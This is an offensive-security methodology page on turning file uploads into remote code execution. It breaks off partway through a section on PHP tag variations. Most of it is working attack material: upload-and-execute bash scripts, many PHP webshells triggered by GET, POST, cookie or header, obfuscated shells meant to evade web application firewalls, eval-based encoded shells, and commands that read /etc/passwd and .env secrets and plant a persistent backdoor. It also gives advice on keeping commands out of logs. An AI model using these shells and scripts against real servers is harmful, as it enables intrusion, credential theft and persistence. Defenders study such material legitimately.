---
title: Malicious File Execution
description: Methodology for achieving remote code execution through uploaded files — covering webshell deployment, server-side execution techniques, configuration abuse, disable_functions bypass, obfuscated payloads, execution chaining, reverse shells, and post-exploitation across PHP, ASP.NET, JSP, Python, Perl, and Node.js server environments.
navigation:
  icon: i-lucide-terminal
  title: Malicious File Execution
---

## What Is Malicious File Execution

::badge
**Critical Severity — CWE-434 / CWE-94 / CWE-98**
::

Malicious file execution represents the ultimate objective of every file upload attack chain — the precise moment when attacker-controlled code runs on the target server with the privileges of the web application process. Uploading a file is merely the delivery mechanism. The real vulnerability exists in the gap between "file stored on disk" and "code interpreted by a server-side engine." A PHP shell sitting in `/uploads/shell.php` is completely harmless if Apache serves it as `text/plain`. An ASPX payload stored in a cloud bucket with no server-side processing has zero impact. The execution context is everything.

Server-side execution requires three conditions to align simultaneously. First, the file must be **stored in a location reachable by the web server** — within the document root or in a path accessible through URL mapping. Second, the web server must **recognize the file as executable** — through its extension, handler configuration, or directory-level directives. Third, the server-side language engine (PHP, .NET, Java, Python) must **interpret the file content as code** rather than serving it as static data.

::note
In bug bounty programs, proving code execution escalates a finding from **Medium** (unrestricted file upload) to **Critical** (remote code execution). The difference in payout can be 10x-50x. Never stop at "I uploaded a PHP file" — always demonstrate that the server executed it. A screenshot of `phpinfo()` output or the result of `id` command is what turns a report into a critical-severity payout.
::

The execution pipeline can be broken at any point, and each break has a different bypass.

::card-group
  :::card
  ---
  icon: i-lucide-play
  title: Direct Execution
  ---
  The uploaded file resides within the web root with a server-recognized executable extension. The web server's handler mapping processes the file through the appropriate language engine when its URL is requested. No additional vulnerability chaining is needed.

  **Trigger:** `GET /uploads/shell.php?cmd=id HTTP/1.1`
  **Requires:** Executable extension + web root storage + active handler
  :::

  :::card
  ---
  icon: i-lucide-link
  title: Indirect Execution via Inclusion
  ---
  The uploaded file has a non-executable extension (`.jpg`, `.gif`, `.txt`) or lives outside the web root. A separate vulnerability — Local File Inclusion (LFI), Server-Side Include (SSI), template injection, or `require()`/`include()` misuse — forces the server to read and interpret the file content as code.

  **Trigger:** `GET /page?file=../../uploads/avatar.gif&cmd=id`
  **Requires:** Upload + separate inclusion vulnerability
  :::

  :::card
  ---
  icon: i-lucide-settings-2
  title: Configuration-Driven Execution
  ---
  An uploaded server configuration file (`.htaccess`, `web.config`, `.user.ini`, `.phtml`) modifies how the web server processes files within the upload directory. Previously static files containing embedded code suddenly become executable because the new configuration maps their extension to a language handler.

  **Trigger:** Upload `.htaccess` → Upload `shell.jpg` → `GET /uploads/shell.jpg?cmd=id`
  **Requires:** Config file upload + shell upload (two-step attack)
  :::

  :::card
  ---
  icon: i-lucide-clock
  title: Deferred / Triggered Execution
  ---
  The uploaded file is not accessible via HTTP but executes through a background process — cron jobs, message queue workers, document conversion pipelines (LibreOffice, wkhtmltopdf, ImageMagick), deserialization handlers, template compilation, or CI/CD pipeline triggers that process uploaded content.

  **Trigger:** Server-side process picks up file from upload queue
  **Requires:** Knowledge of server-side processing pipeline
  :::
::

---

## Execution Pipeline Architecture

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---
```
┌────────────────────────────────────────────────────────────────────────┐
│                  MALICIOUS FILE EXECUTION PIPELINE                     │
├────────────────────────────────────────────────────────────────────────┤
│                                                                        │
│  FILE UPLOADED ──▶ WHERE IS IT STORED?                                │
│                    │                                                   │
│         ┌──────────┼──────────────────────────┐                       │
│         ▼          ▼                          ▼                       │
│  ┌─────────────┐ ┌───────────────┐  ┌────────────────────┐           │
│  │ Web Root    │ │ Outside Root  │  │ Cloud Storage      │           │
│  │ /var/www/   │ │ /tmp/ /data/  │  │ S3/GCS/Azure Blob  │           │
│  │ /htdocs/    │ │ /opt/uploads/ │  │ CDN                │           │
│  └──────┬──────┘ └──────┬────────┘  └────────────────────┘           │
│         │               │           (No server-side exec)            │
│         │               │                                            │
│         ▼               ▼                                            │
│  CAN IT BE ACCESSED?    CHAIN NEEDED                                 │
│  ┌─────────────────┐    ┌──────────────────────────┐                 │
│  │ Direct URL?     │    │ LFI / Path Traversal     │                 │
│  │ /uploads/x.php  │    │ SSRF to internal path    │                 │
│  │ /media/x.jsp    │    │ Symlink following        │                 │
│  └────────┬────────┘    │ Template injection       │                 │
│           │              │ Deserialization trigger   │                 │
│           │              └──────────────────────────┘                 │
│           ▼                                                          │
│  DOES SERVER RECOGNIZE IT AS EXECUTABLE?                             │
│  ┌──────────────────────────────────────────────────┐                │
│  │                                                  │                │
│  │  Extension Check:                                │                │
│  │  .php .phtml .php5 → PHP handler ✓              │                │
│  │  .asp .aspx .ashx  → ASP.NET handler ✓          │                │
│  │  .jsp .jspx .war   → Servlet container ✓        │                │
│  │  .py .pl .cgi      → CGI handler ✓              │                │
│  │  .jpg .png .gif    → Static file ✗              │                │
│  │  .txt .html .css   → Static file ✗              │                │
│  │                                                  │                │
│  │  Config Override:                                │                │
│  │  .htaccess  → AddType/SetHandler changes ✓      │                │
│  │  web.config → Handler mapping changes ✓          │                │
│  │  .user.ini  → auto_prepend_file ✓               │                │
│  │                                                  │                │
│  │  Path Trick:                                     │                │
│  │  Nginx: /upload.jpg/x.php (cgi.fix_pathinfo) ✓  │                │
│  │  IIS:   /upload.asp;.jpg (semicolon parse) ✓    │                │
│  └──────────────────────┬───────────────────────────┘                │
│                         ▼                                            │
│  ┌──────────────────────────────────────────────────┐                │
│  │              CODE EXECUTION ACHIEVED              │                │
│  │                                                  │                │
│  │  ► System command execution                      │                │
│  │  ► File read / write / delete                    │                │
│  │  ► Database access                               │                │
│  │  ► Network pivoting                              │                │
│  │  ► Reverse shell → Interactive access            │                │
│  │  ► Credential harvesting                         │                │
│  │  ► Persistence establishment                     │                │
│  └──────────────────────────────────────────────────┘                │
│                                                                        │
└────────────────────────────────────────────────────────────────────────┘
```

#code
```
Pipeline: Upload → Storage Location → Accessibility → Handler Recognition → Execution
```
::

---

## Fingerprinting for Execution Context

::warning
Every payload decision depends on the target technology. A PHP shell is useless against Tomcat. An ASPX shell does nothing on Apache. Fingerprint the server technology, the language runtime, the web server software, and the execution environment before writing a single payload.
::

### Technology Detection

::tabs
  :::tabs-item{icon="i-lucide-search" label="HTTP Header Fingerprinting"}
  ```bash
  # === Primary header analysis ===
  curl -sI https://target.com | grep -iE "^server:|^x-powered|^x-aspnet|^x-generator|^x-runtime|^x-framework|^x-drupal|^x-varnish|^x-request-id|^via:"

  # === Probe multiple paths for technology leakage ===
  for path in / /index.php /index.asp /index.aspx /index.jsp \
               /default.aspx /robots.txt /favicon.ico \
               /wp-login.php /administrator /user/login \
               /nonexistent_trigger_error; do
    HEADERS=$(curl -sI "https://target.com$path" 2>/dev/null | head -15)
    SERVER=$(echo "$HEADERS" | grep -i "^server:" | head -1)
    POWERED=$(echo "$HEADERS" | grep -i "^x-powered" | head -1)
    STATUS=$(echo "$HEADERS" | head -1)
    [ -n "$SERVER" ] || [ -n "$POWERED" ] && echo "$path → $SERVER | $POWERED | $STATUS"
  done

  # === Cookie analysis for framework detection ===
  curl -sI https://target.com | grep -i "^set-cookie:"
  # PHPSESSID      → PHP
  # ASP.NET_SessionId → ASP.NET
  # JSESSIONID     → Java/Tomcat
  # csrftoken      → Django/Python
  # _rails_session → Ruby on Rails
  # connect.sid    → Express/Node.js
  # laravel_session → Laravel/PHP

  # === Error page fingerprinting ===
  # Trigger errors with invalid input
  curl -s "https://target.com/$(python3 -c 'print("A"*5000)')" 2>/dev/null | head -20
  curl -s "https://target.com/?id='" 2>/dev/null | head -20
  curl -s "https://target.com/nonexistent" 2>/dev/null | grep -iE "apache|nginx|iis|tomcat|express|flask|django|laravel|spring|rails"
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Extension Probing"}
  ```bash
  # === Active extension detection ===
  # The server responds differently to known executable extensions
  # vs unknown static extensions — this reveals which engines are active

  echo ""
  echo "=== Extension Probe Results ==="
  echo "Extension → HTTP Status (different from standard 404 = processed)"
  echo ""

  # Get baseline 404 for comparison
  BASELINE=$(curl -so /dev/null -w "%{http_code}" "https://target.com/nonexistent_baseline_test.fakext" 2>/dev/null)
  echo "Baseline (.fakext): HTTP $BASELINE"
  echo ""

  for ext in php php3 php4 php5 php7 php8 pht phtml phar \
             asp aspx ashx asmx ascx cshtml \
             jsp jspx jsw jsv jspf \
             cfm cfml cfc \
             pl pm cgi py pyw rb erb \
             shtml stm shtm \
             do action; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" "https://target.com/nonexistent_probe.$ext" 2>/dev/null)
    if [ "$STATUS" != "$BASELINE" ]; then
      echo "  [!] .$ext → HTTP $STATUS (DIFFERS from baseline — engine active!)"
    else
      echo "  [-] .$ext → HTTP $STATUS"
    fi
  done

  # === Technology detection tools ===
  whatweb https://target.com -v --color=never 2>/dev/null | head -30
  nuclei -u https://target.com -tags tech -silent 2>/dev/null | head -20
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Upload Directory Analysis"}
  ```bash
  # === Find where uploaded files are stored ===
  # Upload a known file and trace where it ends up

  # Step 1: Upload a test file with unique content
  echo "UNIQUE_MARKER_$(date +%s)" > /tmp/trace_upload.txt
  RESPONSE=$(curl -s -X POST https://target.com/upload \
    -F "file=@/tmp/trace_upload.txt;type=text/plain" \
    -b "session=COOKIE")
  echo "Upload response: $RESPONSE"

  # Step 2: Extract file URL from response
  echo "$RESPONSE" | grep -oiE '"(url|path|src|href|file|location|link)":\s*"[^"]*"'
  echo "$RESPONSE" | grep -oiE 'https?://[^"'\''>\s]*'

  # Step 3: Check common upload directories
  MARKER="UNIQUE_MARKER"
  for dir in uploads files media images static content assets data \
             documents avatars user_uploads public/uploads storage/uploads \
             wp-content/uploads fileadmin user/files tmp resources \
             storage/app/public storage media/uploads img; do
    # Try different filenames
    for fname in trace_upload.txt trace_upload; do
      BODY=$(curl -s "https://target.com/$dir/$fname" 2>/dev/null)
      if echo "$BODY" | grep -q "$MARKER"; then
        echo "[+] FOUND at: /$dir/$fname"
      fi
    done
  done

  # Step 4: Check if upload directory allows directory listing
  for dir in uploads files media images; do
    STATUS=$(curl -so /dev/null -w "%{http_code}" "https://target.com/$dir/" 2>/dev/null)
    if [ "$STATUS" = "200" ]; then
      echo "[+] Directory listing enabled: /$dir/"
      curl -s "https://target.com/$dir/" | grep -oP 'href="[^"]*"' | head -10
    fi
  done

  # Step 5: Check if uploaded files are renamed
  # Upload with known name, check if same name is accessible
  echo "test" > /tmp/known_name_12345.txt
  curl -s -X POST https://target.com/upload \
    -F "file=@/tmp/known_name_12345.txt;type=text/plain" -b "session=COOKIE" > /dev/null
  STATUS=$(curl -so /dev/null -w "%{http_code}" "https://target.com/uploads/known_name_12345.txt" 2>/dev/null)
  echo "Original filename accessible: HTTP $STATUS"
  # If 404 → filename was changed (UUID, hash, timestamp)
  ```
  :::
::

### Technology to Payload Mapping

::collapsible
**Server Technology → Executable Extensions → Shell Language**

| Technology | Web Server | Executable Extensions | Shell Language | Handler |
| --- | --- | --- | --- | --- |
| **PHP / Apache mod_php** | Apache | `.php` `.php3` `.php4` `.php5` `.php7` `.php8` `.pht` `.phtml` `.phar` `.phps` `.pgif` `.inc` | PHP | `AddHandler` / `AddType` |
| **PHP / Apache PHP-FPM** | Apache | `.php` (via `ProxyPassMatch` or `SetHandler`) | PHP | `proxy:fcgi://` |
| **PHP / Nginx PHP-FPM** | Nginx | `.php` (via `location ~ \.php$`) + path info trick | PHP | `fastcgi_pass` |
| **PHP / LiteSpeed** | LiteSpeed | `.php` `.phtml` (via LSAPI) | PHP | LSAPI handler |
| **ASP Classic / IIS** | IIS | `.asp` `.cer` `.asa` `.cdx` | VBScript | `asp.dll` ISAPI |
| **ASP.NET / IIS** | IIS | `.aspx` `.ashx` `.asmx` `.ascx` `.cshtml` `.vbhtml` `.config` `.soap` `.rem` | C# / VB.NET | ASP.NET handler |
| **Java / Tomcat** | Tomcat | `.jsp` `.jspx` `.jsw` `.jsv` `.jspf` `.war` | Java | Jasper JSP compiler |
| **Java / JBoss** | JBoss | `.jsp` `.war` `.ear` | Java | JBoss deployer |
| **Java / WebLogic** | WebLogic | `.jsp` `.war` | Java | WebLogic deployer |
| **Python / Apache** | Apache | `.py` `.pyw` (CGI mode) | Python | `mod_cgi` / `mod_wsgi` |
| **Python / Nginx** | Nginx | N/A (routed by app, not extension) | Python | `uwsgi_pass` / `proxy_pass` |
| **Ruby / Apache** | Apache | `.rb` `.erb` `.rhtml` (CGI mode) | Ruby | `mod_cgi` |
| **Perl** | Apache/Nginx | `.pl` `.pm` `.cgi` | Perl | `mod_cgi` / `mod_perl` |
| **ColdFusion** | Adobe CF | `.cfm` `.cfml` `.cfc` | CFML | CF Runtime |
| **SSI** | Apache | `.shtml` `.stm` `.shtm` | SSI directives | `mod_include` |
| **Node.js** | Express/Koa | N/A (no extension-based execution) | JavaScript | Must overwrite config/route files |
| **Go** | Custom | N/A (compiled binary) | Go | Must overwrite binary or config |
::

---

## PHP Execution Techniques

### Minimal Execution Confirmation

::tip
Always start with the smallest possible payload to confirm execution. A minimal PoC reduces WAF detection surface, avoids triggering security alerts, and gives you clean proof for your bug report. Escalate to full shells only after confirming basic execution.
::

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Non-Destructive PoC Payloads"}
  ```php
  <!-- Level 1: Absolute minimal — unique hash output -->
  <?php echo md5("rce_confirmed"); ?>
  <!-- Expected: 098f6bcd4621d373cade4e832627b4f6... -->

  <!-- Level 2: Server info without system calls -->
  <?php
  echo "EXEC_OK\n";
  echo "PHP=" . phpversion() . "\n";
  echo "OS=" . PHP_OS . "\n";
  echo "SAPI=" . php_sapi_name() . "\n";
  echo "USER=" . get_current_user() . "\n";
  echo "UNAME=" . php_uname() . "\n";
  echo "DOC_ROOT=" . $_SERVER['DOCUMENT_ROOT'] . "\n";
  echo "SCRIPT=" . $_SERVER['SCRIPT_FILENAME'] . "\n";
  echo "SERVER=" . $_SERVER['SERVER_SOFTWARE'] . "\n";
  echo "DISABLED=" . ini_get('disable_functions') . "\n";
  echo "OPEN_BASEDIR=" . ini_get('open_basedir') . "\n";
  ?>

  <!-- Level 3: phpinfo() — comprehensive server config dump -->
  <?php phpinfo(); ?>

  <!-- Level 4: Timestamped proof (unique per execution) -->
  <?php echo "EXECUTED_" . time() . "_" . md5(php_uname() . time()); ?>
  ```

  ```bash
  # === Upload and verify execution ===

  # PoC hash test
  echo '<?php echo md5("rce_" . php_uname()); ?>' > poc.php
  curl -X POST https://target.com/upload \
    -F "file=@poc.php;type=image/jpeg" -b "session=COOKIE"

  # Check for 32-char hex hash in response (proves PHP executed)
  RESPONSE=$(curl -s "https://target.com/uploads/poc.php")
  if echo "$RESPONSE" | grep -qP '^[a-f0-9]{32}$'; then
    echo "[!!!] RCE CONFIRMED — PHP executed successfully"
    echo "Hash output: $RESPONSE"
  else
    echo "[-] PHP did not execute. Response: $RESPONSE"
  fi

  # phpinfo test — look for PHP Version string
  echo '<?php phpinfo(); ?>' > phpinfo.php
  curl -X POST https://target.com/upload \
    -F "file=@phpinfo.php;type=image/jpeg" -b "session=COOKIE"
  HITS=$(curl -s "https://target.com/uploads/phpinfo.php" | grep -c "PHP Version")
  echo "phpinfo matches: $HITS (> 0 = executing)"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Command Execution Shells"}
  ```php
  <!-- === GET-based shells (simplest, but commands appear in logs) === -->

  <!-- system() — outputs directly -->
  <?php system($_GET['cmd']); ?>

  <!-- shell_exec() — returns string, must echo -->
  <?php echo shell_exec($_GET['cmd']); ?>

  <!-- passthru() — outputs binary-safe -->
  <?php passthru($_GET['cmd']); ?>

  <!-- exec() — returns last line, array for all lines -->
  <?php exec($_GET['cmd'], $out); echo implode("\n", $out); ?>

  <!-- Backtick operator — shorthand for shell_exec -->
  <?php echo `{$_GET['cmd']}`; ?>

  <!-- Short tag — minimal bytes -->
  <?=`$_GET[cmd]`?>

  <!-- popen() — opens process pipe -->
  <?php $h = popen($_GET['cmd'], 'r'); echo fread($h, 65535); pclose($h); ?>

  <!-- proc_open() — full process control -->
  <?php
  $d = array(0=>array('pipe','r'), 1=>array('pipe','w'), 2=>array('pipe','w'));
  $p = proc_open($_GET['cmd'], $d, $pipes);
  echo stream_get_contents($pipes[1]);
  echo stream_get_contents($pipes[2]);
  proc_close($p);
  ?>

  <!-- === POST-based shells (commands NOT in access logs) === -->

  <?php system($_POST['cmd']); ?>
  <?php echo shell_exec($_POST['cmd']); ?>
  <?php passthru($_POST['cmd']); ?>

  <!-- === Cookie-based (most stealthy — cookies rarely logged) === -->
  <?php system($_COOKIE['c']); ?>

  <!-- === Header-based (custom header — invisible in most logs) === -->
  <?php system($_SERVER['HTTP_X_CMD']); ?>
  <?php system(getallheaders()['X-Cmd']); ?>

  <!-- === REQUEST-based (accepts GET, POST, or Cookie) === -->
  <?php system($_REQUEST['cmd']); ?>
  ```

  ```bash
  # === Upload command execution shell ===
  echo '<?php system($_GET["cmd"]); ?>' > shell.php
  curl -X POST https://target.com/upload \
    -F "file=@shell.php;type=image/jpeg" -b "session=COOKIE"

  # === Test execution ===
  curl "https://target.com/uploads/shell.php?cmd=id"
  curl "https://target.com/uploads/shell.php?cmd=whoami"
  curl "https://target.com/uploads/shell.php?cmd=uname+-a"
  curl "https://target.com/uploads/shell.php?cmd=cat+/etc/passwd"

  # === POST-based execution (stealthier) ===
  echo '<?php system($_POST["cmd"]); ?>' > shell_post.php
  curl -X POST https://target.com/upload \
    -F "file=@shell_post.php;type=image/jpeg" -b "session=COOKIE"

  curl -X POST "https://target.com/uploads/shell_post.php" -d "cmd=id"
  curl -X POST "https://target.com/uploads/shell_post.php" -d "cmd=cat /etc/passwd"

  # === Header-based execution (stealthiest) ===
  echo '<?php system($_SERVER["HTTP_X_CMD"]); ?>' > shell_hdr.php
  curl -X POST https://target.com/upload \
    -F "file=@shell_hdr.php;type=image/jpeg" -b "session=COOKIE"

  curl "https://target.com/uploads/shell_hdr.php" -H "X-CMD: id"
  curl "https://target.com/uploads/shell_hdr.php" -H "X-CMD: cat /etc/passwd"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Multi-Function Shells"}
  ```php
  <!-- File manager + command exec + file read/write -->
  <?php
  $c = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : null;
  $r = isset($_REQUEST['read']) ? $_REQUEST['read'] : null;
  $w = isset($_REQUEST['write']) ? $_REQUEST['write'] : null;
  $d = isset($_REQUEST['dir']) ? $_REQUEST['dir'] : null;
  $dl = isset($_REQUEST['download']) ? $_REQUEST['download'] : null;

  if ($c) {
    echo "<pre>" . htmlspecialchars(shell_exec($c)) . "</pre>";
  }
  if ($r) {
    echo "<pre>" . htmlspecialchars(file_get_contents($r)) . "</pre>";
  }
  if ($w && isset($_REQUEST['data'])) {
    file_put_contents($w, $_REQUEST['data']);
    echo "Written to: $w";
  }
  if ($d) {
    echo "<pre>"; print_r(scandir($d)); echo "</pre>";
  }
  if ($dl) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($dl).'"');
    readfile($dl);
    exit;
  }
  ?>
  ```

  ```bash
  # Usage examples
  SHELL="https://target.com/uploads/multi.php"

  # Command execution
  curl "$SHELL?cmd=id"

  # Read file
  curl "$SHELL?read=/etc/passwd"
  curl "$SHELL?read=/var/www/html/.env"
  curl "$SHELL?read=/var/www/html/wp-config.php"

  # List directory
  curl "$SHELL?dir=/var/www/html/"
  curl "$SHELL?dir=/"

  # Write file (create persistence)
  curl "$SHELL" -d "write=/var/www/html/backdoor.php&data=<?php system(\$_GET['c']); ?>"

  # Download file
  curl "$SHELL?download=/etc/passwd" -o passwd.txt
  curl "$SHELL?download=/var/www/html/.env" -o env.txt
  ```
  :::
::

### Obfuscated PHP Shells

::caution
Web Application Firewalls and antivirus solutions signature-match patterns like `system(`, `shell_exec(`, `<?php eval(`, `base64_decode(`. Obfuscation rewrites identical functionality using encoding, string manipulation, dynamic invocation, and code transformation to evade static analysis detection.
::

::accordion
  :::accordion-item{icon="i-lucide-eye-off" label="String Construction Obfuscation"}
  These techniques build the function name dynamically at runtime so the literal string `system` never appears in the source code.

  ```php
  <!-- === Concatenation === -->
  <?php $a='sys'.'tem'; $a($_GET['cmd']); ?>
  <?php $a='sh'.'ell'.'_ex'.'ec'; echo $a($_GET['cmd']); ?>
  <?php $a='pas'.'sth'.'ru'; $a($_GET['cmd']); ?>

  <!-- === Reverse string === -->
  <?php $a=strrev('metsys'); $a($_GET['cmd']); ?>
  <?php $a=strrev('cexe_llehs'); echo $a($_GET['cmd']); ?>

  <!-- === ROT13 === -->
  <?php $a=str_rot13('flfgrz'); $a($_GET['cmd']); ?>
  <?php $a=str_rot13('furyy_rkrp'); echo $a($_GET['cmd']); ?>

  <!-- === Base64 === -->
  <?php $a=base64_decode('c3lzdGVt'); $a($_GET['cmd']); ?>
  <?php $a=base64_decode('c2hlbGxfZXhlYw=='); echo $a($_GET['cmd']); ?>
  <?php $a=base64_decode('cGFzc3RocnU='); $a($_GET['cmd']); ?>

  <!-- === Hexadecimal === -->
  <?php $a="\x73\x79\x73\x74\x65\x6d"; $a($_GET['cmd']); ?>
  <?php $a="\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63"; echo $a($_GET['cmd']); ?>

  <!-- === chr() character-by-character === -->
  <?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); $f($_GET['cmd']); ?>

  <!-- === Octal encoding === -->
  <?php $a="\163\171\163\164\145\155"; $a($_GET['cmd']); ?>

  <!-- === str_replace to remove noise === -->
  <?php $a=str_replace('X','','sXyXsXtXeXm'); $a($_GET['cmd']); ?>
  <?php $a=str_replace(array('$','#','@'),'','s$y#s@t$e#m'); $a($_GET['cmd']); ?>

  <!-- === substr extraction === -->
  <?php $h='___system___'; $f=substr($h,3,6); $f($_GET['cmd']); ?>

  <!-- === XOR string construction === -->
  <?php
  // 's'^'>' = ... builds 'system' through XOR operations
  $a = '';
  foreach([115,121,115,116,101,109] as $c) $a .= chr($c);
  $a($_GET['cmd']);
  ?>

  <!-- === Array implode === -->
  <?php $a=implode('',['s','y','s','t','e','m']); $a($_GET['cmd']); ?>

  <!-- === Compound: base64 + rot13 === -->
  <?php $a=base64_decode(str_rot13('ZmxmZ3J6')); /* rot13(base64('system')) */ $a($_GET['c']); ?>

  <!-- === Variable variables === -->
  <?php $x='system'; $$x=$x; $$x($_GET['cmd']); ?>

  <!-- === Extract from larger string === -->
  <?php preg_match('/^.{3}(.{6})/', '___system___', $m); $m[1]($_GET['cmd']); ?>
  ```

  ```bash
  # Test which obfuscation bypasses the WAF
  OBFS=(
    '<?php $a="sys"."tem";$a($_GET["cmd"]); ?>'
    '<?php $a=strrev("metsys");$a($_GET["cmd"]); ?>'
    '<?php $a=str_rot13("flfgrz");$a($_GET["cmd"]); ?>'
    '<?php $a=base64_decode("c3lzdGVt");$a($_GET["cmd"]); ?>'
    '<?php $f=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);$f($_GET["cmd"]); ?>'
    '<?php $a="\x73\x79\x73\x74\x65\x6d";$a($_GET["cmd"]); ?>'
    '<?php $a=str_replace("X","","sXyXsXtXeXm");$a($_GET["cmd"]); ?>'
    '<?php $a=implode("",["s","y","s","t","e","m"]);$a($_GET["cmd"]); ?>'
  )

  echo "Testing ${#OBFS[@]} obfuscation techniques..."
  for i in "${!OBFS[@]}"; do
    echo "${OBFS[$i]}" > "/tmp/obf_$i.php"
    STATUS=$(curl -so /dev/null -w "%{http_code}" -X POST "https://target.com/upload" \
      -F "file=@/tmp/obf_$i.php;type=image/jpeg" -b "session=COOKIE" 2>/dev/null)
    if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
      echo "  [+] Obf #$i → UPLOADED (HTTP $STATUS)"
      # Test execution
      EXEC=$(curl -s "https://target.com/uploads/obf_$i.php?cmd=echo+OBF_${i}_WORKS" 2>/dev/null)
      echo "$EXEC" | grep -q "OBF_${i}_WORKS" && echo "      [!!!] EXECUTED!"
    else
      echo "  [-] Obf #$i → BLOCKED (HTTP $STATUS)"
    fi
    rm -f "/tmp/obf_$i.php"
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-eye-off" label="Dynamic Function Call Obfuscation"}
  Instead of calling `system()` directly, these techniques invoke functions indirectly through PHP's callback mechanisms, variable functions, and reflection API.

  ```php
  <!-- === Variable function from GET parameter === -->
  <?php $_GET['f']($_GET['c']); ?>
  <!-- Usage: ?f=system&c=id -->

  <!-- === call_user_func === -->
  <?php call_user_func('system', $_GET['cmd']); ?>
  <?php call_user_func($_GET['f'], $_GET['c']); ?>

  <!-- === call_user_func_array === -->
  <?php call_user_func_array('system', [$_GET['cmd']]); ?>

  <!-- === array_map callback === -->
  <?php array_map($_GET['f'], [$_GET['c']]); ?>
  <!-- Usage: ?f=system&c=id -->

  <!-- === array_filter callback === -->
  <?php array_filter([$_GET['c']], $_GET['f']); ?>

  <!-- === array_walk callback === -->
  <?php $a=[$_GET['c']]; array_walk($a, function($v) { system($v); }); ?>

  <!-- === usort callback === -->
  <?php $a=[$_GET['c'],''];usort($a,$_GET['f']); ?>

  <!-- === preg_replace_callback === -->
  <?php preg_replace_callback('/.+/',function($m){system($m[0]);},$_GET['cmd']); ?>

  <!-- === ob_start callback === -->
  <?php ob_start('system'); echo $_GET['cmd']; ob_end_flush(); ?>

  <!-- === register_shutdown_function === -->
  <?php register_shutdown_function('system', $_GET['cmd']); ?>

  <!-- === set_error_handler + trigger === -->
  <?php
  set_error_handler(function() use (&$cmd) { system($cmd); });
  $cmd = $_GET['cmd'];
  trigger_error('x');
  ?>

  <!-- === Reflection API === -->
  <?php
  $r = new ReflectionFunction('system');
  $r->invoke($_GET['cmd']);
  ?>

  <!-- === Closure binding === -->
  <?php
  $fn = Closure::fromCallable('system');
  $fn($_GET['cmd']);
  ?>

  <!-- === assert (PHP < 8.0) === -->
  <?php @assert($_GET['cmd']); ?>
  <!-- Usage: ?cmd=system('id') -->

  <!-- === create_function (deprecated but may work) === -->
  <?php $f=create_function('','system($_GET["cmd"]);'); $f(); ?>

  <!-- === eval with dynamic code === -->
  <?php eval('sys'.'tem($_GET["cmd"]);'); ?>
  ```

  ```bash
  # Dynamic function call — most flexible
  echo '<?php $_GET["f"]($_GET["c"]); ?>' > dyn.php
  curl -X POST https://target.com/upload \
    -F "file=@dyn.php;type=image/jpeg" -b "session=COOKIE"

  # Different execution functions via same shell
  curl "https://target.com/uploads/dyn.php?f=system&c=id"
  curl "https://target.com/uploads/dyn.php?f=passthru&c=whoami"
  curl "https://target.com/uploads/dyn.php?f=shell_exec&c=uname+-a"
  curl "https://target.com/uploads/dyn.php?f=exec&c=ls+-la"

  # Even non-exec functions work
  curl "https://target.com/uploads/dyn.php?f=file_get_contents&c=/etc/passwd"
  curl "https://target.com/uploads/dyn.php?f=readfile&c=/etc/hosts"
  curl "https://target.com/uploads/dyn.php?f=highlight_file&c=/var/www/html/config.php"
  ```
  :::

  :::accordion-item{icon="i-lucide-eye-off" label="Eval-Based Encoded Execution"}
  The shell body contains only `eval()` with decoding. The actual payload is sent at runtime through HTTP parameters, never stored in the file itself. This means the file contains no suspicious function names.

  ```php
  <!-- === Base64 eval === -->
  <?php eval(base64_decode($_POST['e'])); ?>
  <!-- POST: e=c3lzdGVtKCdpZCcpOw== → decodes to system('id'); -->

  <!-- === Hex eval === -->
  <?php eval(hex2bin($_POST['h'])); ?>
  <!-- POST: h=73797374656d2827696427293b → system('id'); -->

  <!-- === Gzip + Base64 eval === -->
  <?php eval(gzinflate(base64_decode($_POST['g']))); ?>

  <!-- === ROT13 + Base64 eval === -->
  <?php eval(str_rot13(base64_decode($_POST['r']))); ?>

  <!-- === Convert from array of ints === -->
  <?php
  $c = array_map('chr', json_decode($_POST['a']));
  eval(implode('', $c));
  ?>
  <!-- POST: a=[115,121,115,116,101,109,40,39,105,100,39,41,59] → system('id'); -->

  <!-- === Double-encoded === -->
  <?php eval(base64_decode(base64_decode($_POST['d']))); ?>

  <!-- === XOR decryption === -->
  <?php
  $key = 'secret';
  $data = base64_decode($_POST['x']);
  $result = '';
  for ($i = 0; $i < strlen($data); $i++) {
    $result .= $data[$i] ^ $key[$i % strlen($key)];
  }
  eval($result);
  ?>
  ```

  ```bash
  # === Base64 eval shell ===
  echo '<?php eval(base64_decode($_POST["e"])); ?>' > eval_shell.php
  curl -X POST https://target.com/upload \
    -F "file=@eval_shell.php;type=image/jpeg" -b "session=COOKIE"

  # Execute: encode PHP code as base64
  # system('id');
  curl -X POST "https://target.com/uploads/eval_shell.php" \
    -d "e=$(echo -n "system('id');" | base64)"

  # system('cat /etc/passwd');
  curl -X POST "https://target.com/uploads/eval_shell.php" \
    -d "e=$(echo -n "system('cat /etc/passwd');" | base64)"

  # file_get_contents('/var/www/html/.env');
  curl -X POST "https://target.com/uploads/eval_shell.php" \
    -d "e=$(echo -n "echo file_get_contents('/var/www/html/.env');" | base64)"

  # phpinfo();
  curl -X POST "https://target.com/uploads/eval_shell.php" \
    -d "e=$(echo -n "phpinfo();" | base64)"

  # === Hex eval shell ===
  echo '<?php eval(hex2bin($_POST["h"])); ?>' > hex_shell.php
  # Upload...
  curl -X POST "https://target.com/uploads/hex_shell.php" \
    -d "h=$(echo -n "system('id');" | xxd -p | tr -d '\n')"
  ```
  :::

  :::accordion-item{icon="i-lucide-eye-off" label="PHP Tag Variations & Structural Obfuscation"}
  ```php
  <!-- === PHP tag variations === -->
  
  <!-- Standard opening tag -->
  <?php system($_GET['cmd']); ?>
  
  <!-- Short echo tag (always available since PHP 5.4) -->
  <?= system($_GET['cmd']) ?>
  <?= `$_GET[cmd]` ?>
  
